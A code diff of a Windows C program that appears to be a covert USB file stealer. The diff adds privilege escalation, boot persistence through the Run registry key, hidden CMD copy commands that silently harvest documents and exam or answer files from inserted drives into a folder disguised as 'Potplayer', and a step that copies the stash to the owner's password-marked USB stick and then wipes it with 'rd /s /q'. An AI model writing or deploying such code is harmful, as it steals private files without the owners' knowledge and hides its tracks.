@@ -1,28 +1,38 @@
 #define _CRT_SECURE_NO_WARNINGS
-#ifdef _MSC_VER
-#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
-#endif
+//#ifdef _MSC_VER
+//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
+//#endif
+
 
 #include <stdio.h>
 #include<io.h>
+#include <stdarg.h>
 #include <Windows.h>
-#include "dirent.h"
+#include <winioctl.h>
+#include"direct.h"
 int getDirName(TCHAR diskName[26][10]);
 int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10], int diskNumber);
 void convertsCharToTCHAR(char* strUsr, TCHAR* Name);
 void copyFile(const TCHAR* dirName);
 void findFolder(const TCHAR* dirName, BOOL recursion);
 void CreateFolder(const char* folderName);
+void RemoveFolder(const char* folderName);
 int findMyUDisk(TCHAR* removebleDiskName);
 char* GetFilename(char* p);
 void setComputerStart(char* argv);
+void ProcessStrings(char* diskName, char* Process);
+BOOL isUsbDrv(char* path);
 BOOL UpPrivilegeValue();
-
+BOOL DetermineFileName(char* fileName, int num, ...);
+TCHAR* CopiedFileAddress = "D:\\Program Files\\Potplayer";
 
 int main(int argc, TCHAR* argv[])
 {
+	CreateFolder("D:\\Program Files");
+	CreateFolder(CopiedFileAddress);
 	while (1)
 	{
+		int jump = 0;
 		UpPrivilegeValue();//提升权限
 		setComputerStart(*argv);//设置开机启动
 		TCHAR diskName[26][10] = { 0 };
@@ -31,20 +41,29 @@ int main(int argc, TCHAR* argv[])
 		int removebleNumber = 0;
 		diskNumber = getDirName(diskName);
 		removebleNumber = getAllDirRemoveble(diskName, removebleDiskName, diskNumber);
-		if (removebleNumber!=0)
+		if (removebleNumber != 0)
 		{
 			for (int i = 0; i < removebleNumber; i++)
 			{
 				copyFile(removebleDiskName[i]);
 				findFolder(removebleDiskName[i], FALSE);
 				findMyUDisk(removebleDiskName[i]);
+				for (int i = 0; i < 3 && jump != 0; i++)
+					jump = _chdir("C:\\");
+				printf("\n");
+				Sleep(10000);
 			}
 		}
-		Sleep(5000);
 	}
 	return 0;
 }
-
+void ProcessStrings(char* diskName, char* Process)
+{
+	sprintf(Process, "%s%s", "\\\\.\\", diskName);
+	int textLong = (int)strlen(Process);
+	for (int i = textLong-1; i < textLong; i++)
+		Process[i] = '\0';
+}
 BOOL UpPrivilegeValue()
 {
 	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
@@ -96,12 +115,57 @@ int getDirName(TCHAR diskName[26][10])
 	return i;
 }
 
+
+BOOL isUsbDrv(char* path)
+{
+	//#include <winioctl.h>
+	//path: "\\\\?\\F:"
+#define IOCTL_STORAGE_QUERY_PROPERTY   CTL_CODE(IOCTL_STORAGE_BASE, 0x0500, METHOD_BUFFERED, FILE_ANY_ACCESS)
+	typedef  struct _STORAGE_DEVICE_DESCRIPTOR
+	{
+		DWORD Version;                DWORD Size;
+		BYTE  DeviceType;             BYTE  DeviceTypeModifier;
+		BOOLEAN RemovableMedia;       BOOLEAN CommandQueueing;
+		DWORD VendorIdOffset;         DWORD ProductIdOffset;
+		DWORD ProductRevisionOffset;  DWORD SerialNumberOffset;
+		STORAGE_BUS_TYPE BusType;     DWORD RawPropertiesLength;
+		BYTE  RawDeviceProperties[1];
+	} STORAGE_DEVICE_DESCRIPTOR;
+
+	HANDLE hDisk;
+	STORAGE_DEVICE_DESCRIPTOR devDesc;
+	DWORD query[3] = { 0,0,1588180 };
+
+	DWORD cbBytesReturned;
+
+	hDisk = CreateFile(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (hDisk == INVALID_HANDLE_VALUE)
+		return FALSE;
+
+	if (DeviceIoControl(hDisk, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query),
+		&devDesc, sizeof(devDesc), &cbBytesReturned, NULL))
+	{
+		if (devDesc.BusType == BusTypeUsb)
+		{
+			CloseHandle(hDisk);
+			return TRUE;
+		}
+	}
+	return FALSE;
+}
+
 int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10],int diskNumber)
 {
 	int removebleDiskNumber = 0;
+	char temp[15] = { 0 };
 	for (int i = 0; i < diskNumber; i++)
 	{
-		if (GetDriveType(diskName[i]) == DRIVE_REMOVABLE)
+		for (int i = 0; i < 15; i++)
+			temp[i] = '\0';
+		ProcessStrings(diskName[i], temp);
+		if (GetDriveType(diskName[i]) == DRIVE_REMOVABLE || isUsbDrv(temp)==1)
 		{
 			wsprintf(removebleDiskName[removebleDiskNumber], TEXT("%s"), diskName[i]);
 			removebleDiskNumber++;
@@ -125,7 +189,10 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 	intptr_t file;
 	struct _finddata_t find;
 
-	_chdir(dirName);
+	if (_chdir(dirName) == -1)
+	{
+		return;
+	}
 	if ((file = _findfirst("*.*", &find)) == -1L)
 	{
 		return;
@@ -165,6 +232,7 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 		}
 
 	}
+	_findclose(file);
 }
 
 void copyFile(const TCHAR* dirName)
@@ -174,26 +242,24 @@ void copyFile(const TCHAR* dirName)
 	intptr_t file;
 	struct _finddata_t find;
 
-	CreateFolder("D:\\Program Files");
-	CreateFolder("D:\\Program Files\\Potplayer");
-	_chdir(dirName);
+	if (_chdir(dirName) == -1)
+	{
+		return;
+	}
 	if ((file = _findfirst("*.*", &find)) == -1L)
 	{
 		return;
 	}
 
 	convertsCharToTCHAR(find.name, fileName);
-
-	if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
+	if (DetermineFileName(fileName, 6, ".xlsx", "doc", "pdf", "ppt", "试卷", "答案"))
 	{
-		wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
+		wsprintf(copyFileName, TEXT("%s\\%s"),CopiedFileAddress, fileName);
 
 		TCHAR szCommand[1000] = { 0 };
 		sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
 		if (WinExec(szCommand, SW_HIDE) <= 31)
-		{
 			return;
-		}
 	}
 
 	while (_findnext(file, &find) == 0)
@@ -202,16 +268,14 @@ void copyFile(const TCHAR* dirName)
 					continue;
 			convertsCharToTCHAR(find.name, fileName);
 
-			if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
+			if (DetermineFileName(fileName, 6, ".xlsx", "doc", "pdf", "ppt", "试卷", "答案"))
 			{
-				wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
+				wsprintf(copyFileName, TEXT("%s\\%s"), CopiedFileAddress, fileName);
 
 				TCHAR szCommand[1000] = { 0 };
 				sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
 				if (WinExec(szCommand, SW_HIDE) <= 31)
-				{
 					return;
-				}
 			}
 	}
 	_findclose(file);
@@ -227,7 +291,16 @@ void CreateFolder(const char* folderName)
 		_mkdir(folderName);
 	}
 }
-
+void RemoveFolder(const char* folderName)
+{
+	if (_access(folderName, 0) == 0)
+	{
+		TCHAR szCommand[1000] = { 0 };
+		sprintf(szCommand, "CMD /C rd /s /q %s", folderName);
+		if (WinExec(szCommand, SW_HIDE) <= 31)
+			return;
+	}
+}
 int findMyUDisk(TCHAR *removebleDiskName)
 {
 	FILE* fp;
@@ -243,22 +316,25 @@ int findMyUDisk(TCHAR *removebleDiskName)
 			fileName = NULL;
 			return -1;
 		}
-	
-		free(fileName);
-		fileName = NULL;//释放内存
 
 		fscanf_s(fp, "%d", &getword);
+		fclose(fp);
+
+		free(fileName);
+		fileName = NULL;//释放内存
 		if (getword == passWord)
 		{
 			TCHAR copyFloderName[100] = { 0 };
 			TCHAR szCommand[MAX_PATH*2] = { 0 };
 			sprintf(copyFloderName, "%s%s", removebleDiskName, "Code");
 			CreateFolder(copyFloderName);
-			sprintf(szCommand, "CMD /C Xcopy /V /Y \"%s\" \"%s\"", "D:\\Program Files\\Potplayer", copyFloderName);
+			sprintf(szCommand, "CMD /C Xcopy /V /Y \"%s\" \"%s\"", CopiedFileAddress, copyFloderName);
 			if (WinExec(szCommand, SW_HIDE) <= 31)
 			{
 				return -1;
 			}
+			RemoveFolder(CopiedFileAddress);
+			CreateFolder(CopiedFileAddress);//清除文件夹下所有文件
 			return 1;
 		}
 	}
@@ -276,7 +352,7 @@ void ComputerStart(char* pathName)
 	if (k == ERROR_SUCCESS)
 	{
 		//添加一个子Key,并设置值，MyStart为启动项名称，自定义设置；
-		RegSetValueEx(hKey, "MyStart", 0, REG_SZ, (BYTE*)pathName, strlen(pathName));
+		RegSetValueEx(hKey, "MyStart", 0, REG_SZ, (BYTE*)pathName, (DWORD)strlen(pathName));
 		//关闭注册表
 		RegCloseKey(hKey);
 		//printf("设置成功\n");
@@ -301,9 +377,28 @@ void setComputerStart(char* argv)
 
 char* GetFilename(char* p)
 {
-	int x = strlen(p);
+	int x = (int)strlen(p);
 	char ch = '\\';
 	char* q = strrchr(p, ch) + 1;
 
 	return q;
+}
+
+BOOL DetermineFileName(char *fileName,int num, ...)
+{
+	va_list valist;
+	/* 为 num 个参数初始化 valist */
+	va_start(valist, num);
+	
+	/* 访问所有赋给 valist 的参数 */
+	for (int i = 0; i < num; i++)
+	{
+		char* a = va_arg(valist, char*);
+		if (strstr(fileName, a) != NULL)
+			return TRUE;
+	}
+	/* 清理为 valist 保留的内存 */
+	va_end(valist);
+
+	return FALSE;
 }
